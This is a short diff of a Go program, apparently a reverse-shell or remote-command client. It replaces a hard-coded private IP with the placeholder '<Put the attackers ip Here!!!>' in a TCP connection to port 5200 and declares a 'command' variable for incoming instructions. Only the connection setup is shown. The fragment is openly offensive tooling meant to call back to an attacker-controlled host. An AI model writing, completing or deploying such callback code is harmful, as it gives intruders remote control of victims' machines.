@@ -13,7 +13,7 @@ import (
 func main() {
 
 	command := ""
-	conn, err := net.DialTimeout("tcp", "192.168.1.12:5200", time.Duration(1*time.Second))
+	conn, err := net.DialTimeout("tcp", "<Put the attackers ip Here!!!>:5200", time.Duration(1*time.Second))
 
 	if err != nil {
 		fmt.Println("Nope exiting", conn)
